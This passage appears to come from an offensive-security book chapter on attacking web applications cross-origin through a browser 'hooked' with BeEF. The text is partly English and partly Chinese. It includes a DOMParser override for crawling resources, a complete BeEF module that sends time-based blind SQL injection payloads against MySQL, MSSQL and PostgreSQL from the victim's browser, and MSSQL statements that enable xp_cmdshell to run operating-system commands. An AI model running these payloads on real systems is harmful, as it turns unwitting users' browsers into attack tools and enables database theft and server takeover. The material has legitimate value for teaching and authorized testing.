
```javascript
DOMParser_proto.parseFromString = function(markup, type) {  

  if (/^\s*text\/html\s*(?:;|$)/i.test(type)) {  

   var doc = document.implementation.createHTMLDocument("")

   , doc_elt = doc.documentElement

   , first_elt;

  doc_elt.innerHTML = markup;

  first_elt = doc_elt.firstElementChild;

  if (doc_elt.childElementCount === 1

  && first_elt.localName.toLowerCase() === "html") {  

   doc.replaceChild(first_elt, doc_elt);  

  }  

  return doc;  

 } else {  

  return real_parseFromString.apply(this, arguments);  

 }  

};  

}(DOMParser));
```

Now armed with this code, you are able to enumerate both same and cross-origin resources on the current hooked page, and also on newly discovered same-origin resources. Such discovered information will be very handy when combined with attacks that are covered in the following sections.

# 跨域 Web 应用程序漏洞检测

显然，同源策略 `SOP` 限制了很多攻击类型。但我们知道，只要有决心，总会有绕过的方法。各种技术可以在不违反 `SOP` 的前提下跨域进行攻击。

这些技术在下一节中讨论。包括如何在不同来源的浏览器（即钩装的浏览器）中识别跨站脚本 `XSS` 和 `SQL` 注入漏洞。

## SQL 注入漏洞

`SQL` 注入 `SQLi` 漏洞产生于你能够修改 Web 应用向数据库发送的 `SQL` 语句时出现。我们不会对 `SQL` 注入进行过多的分析，但推荐两本经典资源：《数据库黑客手册》和贾斯汀·克拉克的《`SQL` 注入攻击与防御》。

### 常规 SQL 注入检测

`SQL` 注入攻击根据缺陷的性质可以分为多种类别。通常可以通过 `HTTP` 响应中返回的数据类型来区分。如果返回类似下面的 `SQL` 错误信息，则说明存在错误基于 `SQLi`：

```
You have an error in your SQL syntax; check the \
manual that corresponds to your MySQL server version \
for the right syntax to use near ''' at line 1
```

在某些情况下，Web 应用即使 `SQL` 语句本身包含错误，也不会返回任何错误信息。此类情况通常称为盲 `SQLi`，因为从数据库或应用层面没有任何错误返回（因此得名）。

在这种情况下，仍可以通过比较正常请求与恶意请求的 `HTTP` 响应差异来判断是否影响特定资源。这些差异主要有两种：一种是 **`Content‑Length`** 不同，导致返回的内容体发生变化；另一种是 **响应时间** 不同，例如正常响应需要 1 秒，而恶意请求则耗时更长。

- [目前仅支持 `MySQL`、`PostgreSQL` 和 `MSSQL`，因为它们具有时间延迟的 `SQL` 语句。正如 `Chema Alonso` 所示，19 仍然可以通过复杂的查询诱导时间延迟。此外，还可以使用外带确认，因为 `Oracle` 支持函数来发起 `HTTP` 和 `DNS` 请求：

```javascript
beef.execute(function() {

// time-delay in seconds
var delay = '<%= @delay %>';

// target host/port
var host = '<%= @host %>';
var port = '<%= @port %>';

// target URL to scan
var uri = '<%= @uri %>';

// URL's parameter to scan, in the form key=value
var param = '<%= @parameter %>';

/*some vectors that should handle most injections.
* additional nested parenthesis could be added 
* in case of nested joins. param and delay are 
* placeholders replaced later in create_vector()
*/

var vectors = [
 "param AND delay", "param' AND delay",
 "param) AND delay", "param AND delay --",
 "param' AND delay --", "param) AND delay --",
 "param AND delay AND 'rand'='rand",
 "param' AND delay AND 'rand'='rand",
 "param' AND delay AND ('rand'='rand",
 "param; delay --"
];

var db_types = ["mysql", "mssql", "postgresql"];

var final_vectors = [];

/* every DB has a different time-delay statement
* for Oracle/DB2 and other see Chema Alonso Heavy-queries research:
*/ http://technet.microsoft.com/en-us/library/cc512676.aspx

function create_vector(vector, db_type){
 var result = "";
 if(db_type == "mysql")
   result = vector.replace("param",param) 
             .replace("delay","SLEEP(" + delay + ")");
 if(db_type == "mssql")
    result = vector.replace("param",param) 
             .replace("delay","WAITFOR DELAY '0:0:" + delay + "'");
 if(db_type == "postgresql")
    result = vector.replace("param",param) 
             .replace("delay","PG_SLEEP(" + delay + ")");
 console.log("Vector before URL encoding: " + result);
 return encodeURI(result);
}

// replace param and delay placeholders for supported db types
function populate_global_vectors(){
 for(var i=0;i<db_types.length;i++){
    var db_type = db_types[i];
    for(var e=0;e<vectors.length;e++){
        final_vectors.push(create_vector(vectors[e], db_type));
    }
 }
}

var vector_index = 0;

function next_vector(){
 result = final_vectors[vector_index];
 vector_index++;
 return result;
}

var send_interval;
var successfulVector = "";

function sendRequests(){
 var vector = next_vector();
 var url = uri.replace(param, vector);
 beef.net.forge_request("http", "GET", host, port, url,
    null, null, null, delay + 2, 'script', true, null,
                                                 function(response){
    // if the XHR response is effectively delayed, stop the process
    // because a successfulVector injection has been found.
    if(response.duration >= delay * 1000){
        successfulVector = url;
        console.log("Response  delayed with vector [" + 
        successfulVector + "]");
        clearInterval(send_interval);
    }
 });
}

// create all vectors for the supported DB types
populate_global_vectors();

/* determine normal response time, and adjust 
* delay between requests accordingly
* (base response time + 500 ms */
var response_time;
beef.net.forge_request("http", "GET", host, port, uri,
null, null, null, delay + 2, 'script', true, null,function(response){
 response_time = response.duration;
 send_interval = setInterval(function(){
    sendRequests()},response_time + 500); //can be adjusted
 });
});
```

When the previous code is injected into a hooked browser, `populate_global_vectors()` is called and attack vectors are created according to the supported database types and the payloads listed in the `vectors` array. These payloads are not comprehensive, but should be enough for most attacks. You can of course add more of them, for example, closing more parentheses or using different boolean keywords, to cover situations where nested joins or very long and complex queries are performed.

The next step in your attack is sending a request without any attack vector, to monitor the normal response timing. This is important in order to adjust the time-delay for subsequent attack payloads, in case the target already takes several seconds to reply to normal requests. After the baseline response time has been determined, all the available attack vectors are sent with the `sendRequests()` function. Each `XHR` request is executed with a callback that checks for the response timing after the response arrives. If the response time is equal or bigger than the injected delay, it suggests the injection was successful and the time-based `SQLi` is confirmed. In Figure 9-11 and Figure 9-12, you can see what’s happening under the hood when the code snippet is injected in a browser hooked with `BeEF`.

start figure 

**Figure 9-11:** Time delay of a successful `SQLi` attack

![c09f011.eps](img/c09f011.png)

end figure   start figure 

**Figure 9-12:** Logging of a successful `SQLi` attack

![c09f012.eps](img/c09f012.png)

end figure 

### Cross-origin Blind SQL Injection Exploitation

Now you are able to determine which cross-origin resource is vulnerable to `SQL` injection, and also potentially which database is used. Armed with this information, you can now look to execute operating system commands or extrude database data.

Executing operating system commands largely depends on whether the database has been misconfigured, in particular those settings related to the level of permissions and privileges assigned to the current database user. If the database is running `MSSQL`, for instance, you can use the `xp_cmdshell()` stored procedure to execute commands within the operating system, potentially taking it over. Bear in mind, though, that the application’s database user must have the `sysadmin` role in order to use this stored procedure. As of `MSSQL` version 2005, this feature is disabled by default, although it can be re-enabled by calling the `sp_configure()` stored procedure.20

You can use the following `MSSQL` statements to check whether these stored procedures can be executed. Of course, they need to be formatted in the appropriate `HTTP` request to be smuggled to the database:

```
EXEC sp_configure 'show advanced options',1;RECONFIGURE
EXEC master..xp_cmdshell('ping –n 10 localhost')
```
